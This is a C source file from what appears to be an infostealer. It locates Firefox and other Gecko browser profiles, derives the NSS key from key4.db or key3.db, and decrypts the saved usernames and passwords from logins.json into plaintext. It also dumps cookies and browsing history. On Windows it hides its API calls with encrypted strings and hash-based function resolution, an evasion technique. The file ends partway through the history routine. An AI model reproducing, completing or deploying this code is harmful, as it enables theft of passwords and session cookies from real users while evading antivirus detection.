/*
 * firefox.c — Firefox/Gecko browser data extraction
 *
 * Extracts logins, cookies, and history from Firefox-based browsers.
 * Supports 10 Gecko browsers (Firefox, Waterfox, Pale Moon, etc.).
 *
 * Firefox stores:
 *   - Logins in logins.json, encrypted with keys from key4.db
 *   - Cookies in cookies.sqlite
 *   - History in places.sqlite
 *
 * key4.db is an NSS database containing:
 *   - metaData table: global-salt and password blob
 *   - nssPrivate table: encrypted private key for login decryption
 */

#include "firefox.h"
#include "config.h"
#include "browser_paths.h"
#include "firefox_crypto.h"
#include "utils/base64.h"
#include "sqlite.h"
#include "peb.h"
#include "hash.h"
#include "export_resolve.h"
#include "enc_strings.h"
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

#ifdef _WIN32
#include <windows.h>
#define PATH_SEP "\\"
#define PATH_SEP_CHAR '\\'

/* MinGW memmem compat */
static void *compat_memmem(const void *haystack, size_t haystack_len,
                           const void *needle, size_t needle_len) {
    if (needle_len == 0) return (void *)haystack;
    if (needle_len > haystack_len) return NULL;
    const unsigned char *h = (const unsigned char *)haystack;
    const unsigned char *n = (const unsigned char *)needle;
    for (size_t i = 0; i <= haystack_len - needle_len; i++) {
        if (memcmp(h + i, n, needle_len) == 0)
            return (void *)(h + i);
    }
    return NULL;
}
#define memmem compat_memmem

/* ── PEB-walk singleton for Find* APIs ──────────────────────── */
typedef HANDLE (WINAPI *pFindFirstFileA_ff)(LPCSTR, LPWIN32_FIND_DATAA);
typedef BOOL   (WINAPI *pFindNextFileA_ff)(HANDLE, LPWIN32_FIND_DATAA);
typedef BOOL   (WINAPI *pFindClose_ff)(HANDLE);
typedef DWORD  (WINAPI *pGetFileAttributesA_ff)(LPCSTR);

static struct {
    pFindFirstFileA_ff      pFF;
    pFindNextFileA_ff       pFN;
    pFindClose_ff           pFC;
    pGetFileAttributesA_ff  pGFAA;
    int ready;
} g_ff_find;

static int ff_find_ensure_api(void) {
    if (g_ff_find.ready) return 1;
    char dll[32]; enc_decrypt(enc_kernel32, ENC_KERNEL32_LEN, dll);
    void *k32 = mirage_get_module_by_hash(mirage_encrypted_hash_module(dll));
    if (!k32) return 0;
    char fn[32];
    enc_decrypt(enc_FindFirstFileA, ENC_FINDFIRSTFILEA_LEN, fn);
    g_ff_find.pFF = (pFindFirstFileA_ff)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_FindNextFileA, ENC_FINDNEXTFILEA_LEN, fn);
    g_ff_find.pFN = (pFindNextFileA_ff)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_FindClose, ENC_FINDCLOSE_LEN, fn);
    g_ff_find.pFC = (pFindClose_ff)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_GetFileAttributesA, ENC_GETFILEATTRIBUTESA_LEN, fn);
    g_ff_find.pGFAA = (pGetFileAttributesA_ff)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
    if (!g_ff_find.pFF || !g_ff_find.pFN || !g_ff_find.pFC || !g_ff_find.pGFAA) return 0;
    g_ff_find.ready = 1;
    return 1;
}

#else
#include <sys/stat.h>
#include <dirent.h>
#define PATH_SEP "/"
#define PATH_SEP_CHAR '/'
#endif

/* ── Helper: read entire file ────────────────────────────────── */

static unsigned char *read_file(const char *path, size_t *out_len) {
    FILE *f = fopen(path, "rb");
    if (!f) return NULL;
    fseek(f, 0, SEEK_END);
    long sz = ftell(f);
    fseek(f, 0, SEEK_SET);
    if (sz <= 0) { fclose(f); return NULL; }
    unsigned char *buf = (unsigned char *)malloc((size_t)sz);
    if (!buf) { fclose(f); return NULL; }
    size_t rd = fread(buf, 1, (size_t)sz, f);
    fclose(f);
    if (rd != (size_t)sz) { free(buf); return NULL; }
    *out_len = rd;
    return buf;
}

/* ── Helper: path join ───────────────────────────────────────── */

static char *path_join(const char *a, const char *b) {
    size_t la = strlen(a);
    size_t lb = strlen(b);
    char *out = (char *)malloc(la + 1 + lb + 1);
    if (!out) return NULL;
    memcpy(out, a, la);
    out[la] = PATH_SEP_CHAR;
    memcpy(out + la + 1, b, lb + 1);
    return out;
}

/* ── Helper: check if directory exists ───────────────────────── */

static int dir_exists(const char *path) {
#ifdef _WIN32
    if (!ff_find_ensure_api()) return 0;
    DWORD attr = g_ff_find.pGFAA(path);
    return (attr != INVALID_FILE_ATTRIBUTES &&
            (attr & FILE_ATTRIBUTE_DIRECTORY));
#else
    struct stat st;
    return (stat(path, &st) == 0 && S_ISDIR(st.st_mode));
#endif
}

/* ── Helper: check if file exists ────────────────────────────── */

static int file_exists(const char *path) {
#ifdef _WIN32
    if (!ff_find_ensure_api()) return 0;
    DWORD attr = g_ff_find.pGFAA(path);
    return (attr != INVALID_FILE_ATTRIBUTES &&
            !(attr & FILE_ATTRIBUTE_DIRECTORY));
#else
    struct stat st;
    return (stat(path, &st) == 0 && S_ISREG(st.st_mode));
#endif
}

/* ── Helper: basename ────────────────────────────────────────── */

static const char *basename_of(const char *path) {
    const char *last = strrchr(path, PATH_SEP_CHAR);
    return last ? last + 1 : path;
}

/* ── List subdirectories ─────────────────────────────────────── */

/*
 * List all immediate subdirectories of `path`.
 * Returns malloc'd array of malloc'd strings.
 */
static char **list_subdirs(const char *path, size_t *count) {
    *count = 0;
    size_t cap = 32;
    char **result = (char **)calloc(cap, sizeof(char *));
    if (!result) return NULL;

#ifdef _WIN32
    char search[MAX_PATH];
    snprintf(search, sizeof(search), "%s\\*", path);

    WIN32_FIND_DATAA fd;
    if (!ff_find_ensure_api()) { free(result); return NULL; }
    HANDLE h = g_ff_find.pFF(search, &fd);
    if (h == INVALID_HANDLE_VALUE) {
        free(result);
        return NULL;
    }

    do {
        if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
        if (strcmp(fd.cFileName, ".") == 0 || strcmp(fd.cFileName, "..") == 0) continue;

        char *full = path_join(path, fd.cFileName);
        if (!full) continue;

        if (*count >= cap) {
            cap *= 2;
            char **tmp = (char **)realloc(result, cap * sizeof(char *));
            if (!tmp) { free(full); continue; }
            result = tmp;
        }
        result[(*count)++] = full;
    } while (g_ff_find.pFN(h, &fd));

    g_ff_find.pFC(h);
#else
    DIR *d = opendir(path);
    if (!d) { free(result); return NULL; }

    struct dirent *ent;
    while ((ent = readdir(d)) != NULL) {
        if (ent->d_name[0] == '.') continue;
        if (ent->d_type != DT_DIR) continue;

        char *full = path_join(path, ent->d_name);
        if (!full) continue;

        if (*count >= cap) {
            cap *= 2;
            char **tmp = (char **)realloc(result, cap * sizeof(char *));
            if (!tmp) { free(full); continue; }
            result = tmp;
        }
        result[(*count)++] = full;
    }
    closedir(d);
#endif

    return result;
}

/* ═══════════════════════════════════════════════════════════════
 *  Firefox login extraction (key4.db + logins.json)
 * ═══════════════════════════════════════════════════════════════ */

/*
 * Extract the decryption key from key4.db.
 *
 * Flow:
 *   1. Read metaData table → get global-salt and password blob
 *   2. Decrypt password blob with metaPBE (PBKDF2 + AES-128-CBC)
 *   3. Read nssPrivate table → get encrypted key (a11 or a102)
 *   4. Decrypt nssPrivate key with nssPBE (3DES-CBC)
 *   5. Return decrypted key for login decryption
 *
 * Returns 0 on success, -1 on failure.
 */
static uint32_t be32(const uint8_t *p) {
    return ((uint32_t)p[0] << 24) | ((uint32_t)p[1] << 16) |
           ((uint32_t)p[2] << 8)  | (uint32_t)p[3];
}

static uint16_t be16(const uint8_t *p) {
    return (uint16_t)((p[0] << 8) | p[1]);
}

static int bdb_find_value(const uint8_t *data, size_t data_len,
                          const char *key_name,
                          uint8_t **out_val, size_t *out_len) {
    if (data_len < 64) return -1;
    uint32_t magic = be32(data);
    if (magic != 0x00061561) return -1;
    uint32_t ps = be32(data + 12);
    if (ps < 512 || ps > 65536) return -1;
    if (data_len < 0x3C) return -1;
    uint32_t nb_key = be32(data + 0x38);
    if (nb_key == 0 || nb_key > 1000) return -1;

    for (uint32_t page = 1; page < 10 && (size_t)page * ps < data_len; page++) {
        size_t pb = (size_t)page * ps;
        if (pb + 4 > data_len) break;
        uint32_t entries = nb_key * 2;
        if (entries > 256) entries = 256;
        if (pb + 2 + entries * 2 > data_len) continue;

        uint16_t off[256];
        for (uint32_t i = 0; i < entries; i++)
            off[i] = be16(data + pb + 2 + i * 2);

        for (uint32_t i = 0; i + 1 < entries; i += 2) {
            size_t vs = pb + off[i];
            size_t ks = pb + off[i + 1];
            size_t end2 = (i + 2 < entries) ? pb + off[i + 2] : pb + ps;
            if (ks >= data_len || end2 > data_len || vs >= ks) continue;
            size_t kl = end2 - ks;
            size_t vl = ks - vs;
            if (kl == strlen(key_name) && memcmp(data + ks, key_name, kl) == 0) {
                *out_val = (uint8_t *)malloc(vl);
                if (!*out_val) return -1;
                memcpy(*out_val, data + vs, vl);
                *out_len = vl;
                return 0;
            }
        }
    }
    return -1;
}

static int bdb_find_bin_key(const uint8_t *data, size_t data_len,
                            const uint8_t *key, size_t key_len,
                            uint8_t **out_val, size_t *out_len) {
    if (data_len < 64) return -1;
    uint32_t ps = be32(data + 12);
    if (ps < 512 || ps > 65536) return -1;
    /* ponytail: 0x3C=60, unreachable after data_len<64 check above; removed */
    uint32_t nb_key = be32(data + 0x38);
    if (nb_key == 0 || nb_key > 1000) return -1;

    for (uint32_t page = 1; page < 10 && (size_t)page * ps < data_len; page++) {
        size_t pb = (size_t)page * ps;
        if (pb + 4 > data_len) break;
        uint32_t entries = nb_key * 2;
        if (entries > 256) entries = 256;
        if (pb + 2 + entries * 2 > data_len) continue;

        uint16_t off[256];
        for (uint32_t i = 0; i < entries; i++)
            off[i] = be16(data + pb + 2 + i * 2);

        for (uint32_t i = 0; i + 1 < entries; i += 2) {
            size_t vs = pb + off[i];
            size_t ks = pb + off[i + 1];
            size_t end2 = (i + 2 < entries) ? pb + off[i + 2] : pb + ps;
            if (ks >= data_len || end2 > data_len || vs >= ks) continue;
            size_t kl = end2 - ks;
            size_t vl = ks - vs;
            if (kl == key_len && memcmp(data + ks, key, kl) == 0) {
                *out_val = (uint8_t *)malloc(vl);
                if (!*out_val) return -1;
                memcpy(*out_val, data + vs, vl);
                *out_len = vl;
                return 0;
            }
        }
    }
    return -1;
}

static int try_key3_db(const char *profile_path,
                        unsigned char *key_out, size_t *key_len) {
    char *key3_path = path_join(profile_path, "key3.db");
    if (!key3_path) return -1;

    size_t flen = 0;
    uint8_t *fdata = read_file(key3_path, &flen);
    free(key3_path);
    if (!fdata) return -1;

    uint8_t *gs = NULL; size_t gsl = 0;
    if (bdb_find_value(fdata, flen, "global-salt", &gs, &gsl) != 0) {
        free(fdata); return -1;
    }

    uint8_t *pc = NULL; size_t pcl = 0;
    if (bdb_find_value(fdata, flen, "password-check", &pc, &pcl) != 0) {
        free(gs); free(fdata); return -1;
    }

    unsigned char pdec[128]; size_t pdecl = 0;
    int rc = fx_decrypt_nss_pbe(gs, gsl, (const unsigned char *)"", 0,
                                 pc, pcl, pdec, sizeof(pdec), &pdecl);
    free(pc);
    if (rc != 0 || pdecl < 14 || memcmp(pdec, "password-check", 14) != 0) {
        free(gs); free(fdata); return -1;
    }

    uint8_t nss_key[16];
    nss_key[0] = 0xf8;
    memset(nss_key + 1, 0, 14);
    nss_key[15] = 0x01;

    uint8_t *nb = NULL; size_t nbl = 0;
    if (bdb_find_bin_key(fdata, flen, nss_key, 16, &nb, &nbl) != 0) {
        free(gs); free(fdata); return -1;
    }

    unsigned char ndec[512]; size_t ndecl = 0;
    rc = fx_decrypt_nss_pbe(gs, gsl, (const unsigned char *)"", 0,
                             nb, nbl, ndec, sizeof(ndec), &ndecl);
    free(nb); free(gs); free(fdata);
    if (rc != 0 || ndecl < 24) return -1;

    memcpy(key_out, ndec + ndecl - 24, 24);
    *key_len = 24;
    return 0;
}


static int firefox_extract_key(const char *profile_path,
                               unsigned char *nss_key_out, size_t *nss_key_len) {
    char *key4_path = path_join(profile_path, "key4.db");
    if (!key4_path) return -1;

    size_t db_len = 0;
    unsigned char *db_data = read_file(key4_path, &db_len);
    free(key4_path);
    if (!db_data) return -1;

    SqliteDb db;
    if (sqlite_open(&db, db_data, db_len) != 0) {
        free(db_data);
        return -1;
    }

    /* ── Step 1: Read metaData table ────────────────────────── */

    SqliteRow *meta_rows = NULL;
    size_t meta_count = 0;
    if (sqlite_read_table(&db, "metaData", &meta_rows, &meta_count) != 0) {
        sqlite_close(&db);
        free(db_data);
        return -1;
    }

    SqliteColumns meta_cols;
    sqlite_get_columns(&db, "metaData", &meta_cols);

    int idx_id = -1, idx_item1 = -1;
    for (size_t i = 0; i < meta_cols.count; i++) {
        if (strcmp(meta_cols.names[i], "id") == 0) idx_id = (int)i;
        if (strcmp(meta_cols.names[i], "item1") == 0) idx_item1 = (int)i;
    }
    sqlite_free_columns(&meta_cols);

    const unsigned char *global_salt = NULL;
    size_t gs_len = 0;
    const unsigned char *password_blob = NULL;
    size_t pb_len = 0;

    for (size_t r = 0; r < meta_count; r++) {
        SqliteRow *row = &meta_rows[r];
        if (idx_id < 0 || idx_item1 < 0) continue;
        if (row->count <= (size_t)idx_item1) continue;
        if (row->values[idx_id].type != SQLITE_VAL_TEXT) continue;

        const char *id = (const char *)row->values[idx_id].as.text.ptr;
        size_t id_len = row->values[idx_id].as.text.len;

        if (id_len == 10 && memcmp(id, "global-salt", 10) == 0) {
            if (row->values[idx_item1].type == SQLITE_VAL_BLOB) {
                global_salt = row->values[idx_item1].as.blob.ptr;
                gs_len = row->values[idx_item1].as.blob.len;
            }
        } else if (id_len == 8 && memcmp(id, "password", 8) == 0) {
            if (row->values[idx_item1].type == SQLITE_VAL_BLOB) {
                password_blob = row->values[idx_item1].as.blob.ptr;
                pb_len = row->values[idx_item1].as.blob.len;
            }
        }
    }

    if (!global_salt || !password_blob) {
        sqlite_free_rows(meta_rows, meta_count);
        sqlite_close(&db);
        free(db_data);
        return -1;
    }

    /* Copy before sqlite_free_rows to avoid use-after-free */
    unsigned char gs_buf[256], pw_buf[1024];
    size_t gs_buf_len = gs_len < sizeof(gs_buf) ? gs_len : sizeof(gs_buf);
    size_t pw_buf_len = pb_len < sizeof(pw_buf) ? pb_len : sizeof(pw_buf);
    memcpy(gs_buf, global_salt, gs_buf_len);
    memcpy(pw_buf, password_blob, pw_buf_len);
    global_salt = gs_buf;
    gs_len = gs_buf_len;
    password_blob = pw_buf;
    pb_len = pw_buf_len;

    sqlite_free_rows(meta_rows, meta_count);

    /* ── Step 2: Decrypt password blob with metaPBE ─────────── */

    unsigned char decrypted_pw[1024];
    size_t dec_pw_len = 0;
    if (fx_decrypt_meta_pbe(global_salt, gs_len,
                            password_blob, pb_len,
                            decrypted_pw, sizeof(decrypted_pw), &dec_pw_len) != 0) {
        sqlite_close(&db);
        free(db_data);
        return -1;
    }

    /* ── Step 3: Read nssPrivate table ──────────────────────── */

    SqliteRow *priv_rows = NULL;
    size_t priv_count = 0;
    if (sqlite_read_table(&db, "nssPrivate", &priv_rows, &priv_count) != 0) {
        sqlite_close(&db);
        free(db_data);
        return -1;
    }

    SqliteColumns priv_cols;
    sqlite_get_columns(&db, "nssPrivate", &priv_cols);

    /* Find column indices: a11 (col 1), a102 (col 2) */
    int idx_a11 = -1, idx_a102 = -1;
    if (priv_cols.count > 1) idx_a11 = 1;  /* second column */
    if (priv_cols.count > 2) idx_a102 = 2; /* third column */
    sqlite_free_columns(&priv_cols);

    const unsigned char *nss_enc = NULL;
    size_t nss_enc_len = 0;

    for (size_t r = 0; r < priv_count; r++) {
        SqliteRow *row = &priv_rows[r];
        if (idx_a11 >= 0 && row->count > (size_t)idx_a11 &&
            row->values[idx_a11].type == SQLITE_VAL_BLOB) {
            nss_enc = row->values[idx_a11].as.blob.ptr;
            nss_enc_len = row->values[idx_a11].as.blob.len;
            break;
        }
        if (idx_a102 >= 0 && row->count > (size_t)idx_a102 &&
            row->values[idx_a102].type == SQLITE_VAL_BLOB) {
            nss_enc = row->values[idx_a102].as.blob.ptr;
            nss_enc_len = row->values[idx_a102].as.blob.len;
            break;
        }
    }

    if (!nss_enc) {
        sqlite_free_rows(priv_rows, priv_count);
        sqlite_close(&db);
        free(db_data);
        return -1;
    }

    /* Copy before sqlite_free_rows to avoid use-after-free */
    unsigned char nss_buf[512];
    size_t nss_buf_len = nss_enc_len < sizeof(nss_buf) ? nss_enc_len : sizeof(nss_buf);
    memcpy(nss_buf, nss_enc, nss_buf_len);
    nss_enc = nss_buf;
    nss_enc_len = nss_buf_len;

    sqlite_free_rows(priv_rows, priv_count);
    sqlite_close(&db);
    free(db_data);

    /* ── Step 4: Decrypt nssPrivate key with nssPBE ─────────── */

    size_t nss_len = 0;
    if (fx_decrypt_nss_pbe(global_salt, gs_len,
                           decrypted_pw, dec_pw_len,
                           nss_enc, nss_enc_len,
                           nss_key_out, 512, &nss_len) != 0)
        return try_key3_db(profile_path, nss_key_out, nss_key_len);

    *nss_key_len = nss_len;
    return 0;
}
/* ── Parse logins.json ───────────────────────────────────────── */

/*
 * Firefox logins.json contains encrypted login entries.
 * Each entry has: hostname, encryptedUsername, encryptedPassword.
 * The encrypted values are base64-encoded, encrypted with nssPBE or loginPBE.
 */

typedef struct {
    char hostname[512];
    unsigned char user_enc[4096];
    size_t user_enc_len;
    unsigned char pass_enc[4096];
    size_t pass_enc_len;
} LoginEntry;

static int parse_logins_json(const char *json, size_t json_len,
                             LoginEntry *entries, size_t *count,
                             size_t max_entries) {
    *count = 0;
    size_t pos = 0;

    while (pos < json_len && *count < max_entries) {
        const char *host_marker = "\"hostname\"";
        const char *host_start = memmem(json + pos, json_len - pos,
                                         host_marker, strlen(host_marker));
        if (!host_start) break;

        const char *hq = strchr(host_start + strlen(host_marker), '"');
        if (!hq) { pos = (size_t)(host_start - json + 1); continue; }
        hq++;
        const char *hq_end = memchr(hq, '"', (size_t)(json + json_len - hq));
        if (!hq_end) break;

        size_t hostname_len = (size_t)(hq_end - hq);
        if (hostname_len >= 512) hostname_len = 511;

        const char *user_marker = "\"encryptedUsername\"";
        const char *user_start = memmem(hq_end, (size_t)(json + json_len - hq_end),
                                         user_marker, strlen(user_marker));
        if (!user_start) { pos = (size_t)(hq_end - json + 1); continue; }

        const char *uq = strchr(user_start + strlen(user_marker), '"');
        if (!uq) { pos = (size_t)(user_start - json + 1); continue; }
        uq++;
        const char *uq_end = memchr(uq, '"', (size_t)(json + json_len - uq));
        if (!uq_end) break;
        const char *user_b64 = uq;
        size_t user_b64_len = (size_t)(uq_end - uq);

        const char *pass_marker = "\"encryptedPassword\"";
        const char *pass_start = memmem(uq_end, (size_t)(json + json_len - uq_end),
                                         pass_marker, strlen(pass_marker));
        if (!pass_start) { pos = (size_t)(uq_end - json + 1); continue; }

        const char *pq = strchr(pass_start + strlen(pass_marker), '"');
        if (!pq) { pos = (size_t)(pass_start - json + 1); continue; }
        pq++;
        const char *pq_end = memchr(pq, '"', (size_t)(json + json_len - pq));
        if (!pq_end) break;
        const char *pass_b64 = pq;
        size_t pass_b64_len = (size_t)(pq_end - pq);

        LoginEntry *e = &entries[*count];
        memset(e, 0, sizeof(*e));
        memcpy(e->hostname, hq, hostname_len);
        e->hostname[hostname_len] = '\0';

        int u_len = base64_decode(user_b64, user_b64_len,
                                   e->user_enc, sizeof(e->user_enc));
        int p_len = base64_decode(pass_b64, pass_b64_len,
                                   e->pass_enc, sizeof(e->pass_enc));

        if (u_len < 0 || p_len < 0) {
            pos = (size_t)(pq_end - json + 1);
            continue;
        }

        e->user_enc_len = (size_t)u_len;
        e->pass_enc_len = (size_t)p_len;

        (*count)++;
        pos = (size_t)(pq_end - json + 1);
    }

    return (*count > 0) ? 0 : -1;
}

static int decrypt_login_entries(LoginEntry *entries, size_t count,
                                 const unsigned char *nss_key, size_t nss_key_len,
                                 const unsigned char *global_salt, size_t gs_len,
                                 char **results, size_t *result_count) {
    *result_count = 0;

    for (size_t i = 0; i < count; i++) {
        LoginEntry *e = &entries[i];
        unsigned char user_dec[4096], pass_dec[4096];
        size_t user_dec_len = 0, pass_dec_len = 0;
        int user_ok = 0, pass_ok = 0;

        /* Decrypt username — try nssPBE (ASN.1) first, fallback to loginPBE */
        if (e->user_enc_len > 2 && e->user_enc[0] == 0x30) {
            user_ok = (fx_decrypt_nss_pbe(global_salt, gs_len,
                                           nss_key, nss_key_len,
                                           e->user_enc, e->user_enc_len,
                                           user_dec, sizeof(user_dec),
                                           &user_dec_len) == 0);
        }
        if (!user_ok) {
            user_ok = (fx_decrypt_login_pbe(nss_key, nss_key_len,
                                             e->user_enc, e->user_enc_len,
                                             user_dec, sizeof(user_dec),
                                             &user_dec_len) == 0);
        }

        /* Decrypt password — same strategy */
        if (e->pass_enc_len > 2 && e->pass_enc[0] == 0x30) {
            pass_ok = (fx_decrypt_nss_pbe(global_salt, gs_len,
                                           nss_key, nss_key_len,
                                           e->pass_enc, e->pass_enc_len,
                                           pass_dec, sizeof(pass_dec),
                                           &pass_dec_len) == 0);
        }
        if (!pass_ok) {
            pass_ok = (fx_decrypt_login_pbe(nss_key, nss_key_len,
                                             e->pass_enc, e->pass_enc_len,
                                             pass_dec, sizeof(pass_dec),
                                             &pass_dec_len) == 0);
        }

        if (user_ok && pass_ok) {
            size_t hlen = strlen(e->hostname);
            size_t line_len = hlen + 1 + user_dec_len + 1 + pass_dec_len + 2;
            char *line = (char *)malloc(line_len);
            if (line) {
                memcpy(line, e->hostname, hlen);
                line[hlen] = '\t';
                memcpy(line + hlen + 1, user_dec, user_dec_len);
                line[hlen + 1 + user_dec_len] = '\t';
                memcpy(line + hlen + 1 + user_dec_len + 1, pass_dec, pass_dec_len);
                line[line_len - 1] = '\n';
                results[(*result_count)++] = line;
            }
        }
    }

    return (*result_count > 0) ? 0 : -1;
}

static char **firefox_extract_logins(const char *profile_path, size_t *count) {
    *count = 0;

    /* First get the NSS decryption key from key4.db */
    unsigned char nss_key[512];
    size_t nss_key_len = 0;
    if (firefox_extract_key(profile_path, nss_key, &nss_key_len) != 0)
        return NULL;

    /* Read global salt (needed for nssPBE / loginPBE decryption) */
    char *key4_path = path_join(profile_path, "key4.db");
    if (!key4_path) return NULL;
    size_t db_len = 0;
    unsigned char *db_data = read_file(key4_path, &db_len);
    free(key4_path);
    if (!db_data) return NULL;

    SqliteDb db;
    if (sqlite_open(&db, db_data, db_len) != 0) {
        free(db_data);
        return NULL;
    }

    SqliteRow *meta_rows = NULL;
    size_t meta_count = 0;
    sqlite_read_table(&db, "metaData", &meta_rows, &meta_count);

    const unsigned char *global_salt = NULL;
    size_t gs_len = 0;

    SqliteColumns meta_cols;
    sqlite_get_columns(&db, "metaData", &meta_cols);
    int idx_id = -1, idx_item1 = -1;
    for (size_t i = 0; i < meta_cols.count; i++) {
        if (strcmp(meta_cols.names[i], "id") == 0) idx_id = (int)i;
        if (strcmp(meta_cols.names[i], "item1") == 0) idx_item1 = (int)i;
    }
    sqlite_free_columns(&meta_cols);

    for (size_t r = 0; r < meta_count; r++) {
        SqliteRow *row = &meta_rows[r];
        if (idx_id < 0 || idx_item1 < 0) continue;
        if (row->values[idx_id].type != SQLITE_VAL_TEXT) continue;
        const char *id = (const char *)row->values[idx_id].as.text.ptr;
        size_t id_len = row->values[idx_id].as.text.len;
        if (id_len == 10 && memcmp(id, "global-salt", 10) == 0) {
            if (row->values[idx_item1].type == SQLITE_VAL_BLOB) {
                global_salt = row->values[idx_item1].as.blob.ptr;
                gs_len = row->values[idx_item1].as.blob.len;
            }
        }
    }
    if (!global_salt) {
        sqlite_free_rows(meta_rows, meta_count);
        sqlite_close(&db);
        free(db_data);
        return NULL;
    }
    /* Copy before sqlite_free_rows to avoid use-after-free */
    unsigned char gs_local[256];
    size_t gs_local_len = gs_len < sizeof(gs_local) ? gs_len : sizeof(gs_local);
    memcpy(gs_local, global_salt, gs_local_len);
    global_salt = gs_local;
    gs_len = gs_local_len;

    sqlite_free_rows(meta_rows, meta_count);
    sqlite_close(&db);
    free(db_data);

    /* Read and parse logins.json */
    char *logins_path = path_join(profile_path, "logins.json");
    if (!logins_path) return NULL;

    size_t json_len = 0;
    unsigned char *json_data = read_file(logins_path, &json_len);
    free(logins_path);
    if (!json_data) return NULL;

    size_t entry_cap = 64;
    LoginEntry *entries = (LoginEntry *)calloc(entry_cap, sizeof(LoginEntry));
    if (!entries) { free(json_data); return NULL; }

    size_t entry_count = 0;
    if (parse_logins_json((const char *)json_data, json_len,
                           entries, &entry_count, entry_cap) != 0) {
        free(entries);
        free(json_data);
        return NULL;
    }

    free(json_data);

    /* Decrypt all entries */
    char **results = (char **)calloc(entry_cap, sizeof(char *));
    if (!results) { free(entries); return NULL; }

    size_t result_count = 0;
    decrypt_login_entries(entries, entry_count,
                          nss_key, nss_key_len,
                          global_salt, gs_len,
                          results, &result_count);

    free(entries);

    if (result_count == 0) {
        free(results);
        return NULL;
    }
    *count = result_count;
    return results;
}

/* ═══════════════════════════════════════════════════════════════
 *  Firefox cookie extraction
 * ═══════════════════════════════════════════════════════════════ */

static char **firefox_extract_cookies(const char *profile_path, size_t *count) {
    *count = 0;

    char *db_path = path_join(profile_path, "cookies.sqlite");
    if (!db_path) return NULL;

    size_t db_len = 0;
    unsigned char *db_data = read_file(db_path, &db_len);
    free(db_path);
    if (!db_data) return NULL;

    SqliteDb db;
    if (sqlite_open(&db, db_data, db_len) != 0) {
        free(db_data);
        return NULL;
    }

    SqliteRow *rows = NULL;
    size_t row_count = 0;
    if (sqlite_read_table(&db, "moz_cookies", &rows, &row_count) != 0) {
        sqlite_close(&db);
        free(db_data);
        return NULL;
    }

    SqliteColumns cols;
    sqlite_get_columns(&db, "moz_cookies", &cols);

    /* Firefox moz_cookies columns in order: host, name, value, path, ... */
    enum FirefoxCookieCols {
        COL_HOST = 0,
        COL_NAME = 1,
        COL_VALUE = 2,
        COL_PATH = 3,
        COL_EXPIRY = 4
    };
    if (cols.count < 5) {
        sqlite_free_columns(&cols);
        sqlite_free_rows(rows, row_count);
        sqlite_close(&db);
        free(db_data);
        return NULL;
    }
    sqlite_free_columns(&cols);

    size_t cap = 64;
    char **result = (char **)calloc(cap, sizeof(char *));
    if (!result) {
        sqlite_free_rows(rows, row_count);
        sqlite_close(&db);
        free(db_data);
        return NULL;
    }

    for (size_t r = 0; r < row_count; r++) {
        SqliteRow *row = &rows[r];
        if (row->count < 5) continue;

        if (row->values[COL_HOST].type != SQLITE_VAL_TEXT) continue;
        if (row->values[COL_NAME].type != SQLITE_VAL_TEXT) continue;
        if (row->values[COL_VALUE].type != SQLITE_VAL_TEXT) continue;
        if (row->values[COL_PATH].type != SQLITE_VAL_TEXT) continue;
        if (row->values[COL_EXPIRY].type != SQLITE_VAL_INTEGER) continue;

        const char *host = (const char *)row->values[COL_HOST].as.text.ptr;
        size_t host_len = row->values[COL_HOST].as.text.len;
        const char *name = (const char *)row->values[COL_NAME].as.text.ptr;
        size_t name_len = row->values[COL_NAME].as.text.len;
        const char *value = (const char *)row->values[COL_VALUE].as.text.ptr;
        size_t value_len = row->values[COL_VALUE].as.text.len;
        const char *path = (const char *)row->values[COL_PATH].as.text.ptr;
        size_t path_len = row->values[COL_PATH].as.text.len;
        int64_t expiry = row->values[COL_EXPIRY].as.integer;

        char exp_str[32];
        snprintf(exp_str, sizeof(exp_str), "%lld", (long long)expiry);

        size_t line_len = host_len + 1 + name_len + 1 + path_len + 1 +
                          value_len + 1 + strlen(exp_str) + 2;
        char *line = (char *)malloc(line_len);
        if (!line) continue;

        int written = snprintf(line, line_len, "%s\t%s\t%s\t%s\t%s\n",
                 host, name, path, exp_str, value);
        if (written < 0 || (size_t)written >= line_len) {
            free(line);
            continue;
        }

        if (*count >= cap) {
            cap *= 2;
            char **tmp = (char **)realloc(result, cap * sizeof(char *));
            if (tmp) result = tmp;
        }
        result[(*count)++] = line;
    }

    sqlite_free_rows(rows, row_count);
    sqlite_close(&db);
    free(db_data);

    if (*count == 0) {
        free(result);
        return NULL;
    }
    return result;
}

/* ═══════════════════════════════════════════════════════════════
 *  Firefox history extraction
 * ═══════════════════════════════════════════════════════════════ */

static char **firefox_extract_history(const char *profile_path, size_t *count) {
    *count = 0;

    char *db_path = path_join(profile_path, "places.sqlite");
    if (!db_path) return NULL;

    size_t db_len = 0;
    unsigned char *db_data = read_file(db_path, &db_len);
    free(db_path);
    if (!db_data) return NULL;

    SqliteDb db;
    if (sqlite_open(&db, db_data, db_len) != 0) {
        free(db_data);
        return NULL;
    }

    SqliteRow *rows = NULL;
    size_t row_count = 0;
    if (sqlite_read_table(&db, "moz_places", &rows, &row_count) != 0) {
        sqlite_close(&db);
        free(db_data);
        return NULL;
    }

    SqliteColumns cols;
    sqlite_get_columns(&db, "moz_places", &cols);

    /* moz_places: url(0), title(1), visit_count(2), last_visit_date(3) */
    enum FirefoxHistoryCols {
        COL_URL = 0,
        COL_TITLE = 1,
        COL_VISITS = 2
    };
    if (cols.count < 3) {
        sqlite_free_columns(&cols);
        sqlite_free_rows(rows, row_count);
        sqlite_close(&db);
        free(db_data);
        return NULL;
    }
    sqlite_free_columns(&cols);

    size_t cap = 64;
    char **result = (char **)calloc(cap, sizeof(char *));
    if (!result) {
        sqlite_free_rows(rows, row_count);
        sqlite_close(&db);
        free(db_data);
        return NULL;
    }

    for (size_t r = 0; r < row_count; r++) {
        SqliteRow *row = &rows[r];
        if (row->count < 3) continue;

        if (row->values[COL_URL].type != SQLITE_VAL_TEXT) continue;

        const char *url = (const char *)row->values[COL_URL].as.text.ptr;
        size_t url_len = row->values[COL_URL].as.text.len;
        const char *title = "";
        size_t title_len = 0;
        if (row->values[COL_TITLE].type == SQLITE_VAL_TEXT) {
            title = (const char *)row->values[COL_TITLE].as.text.ptr;
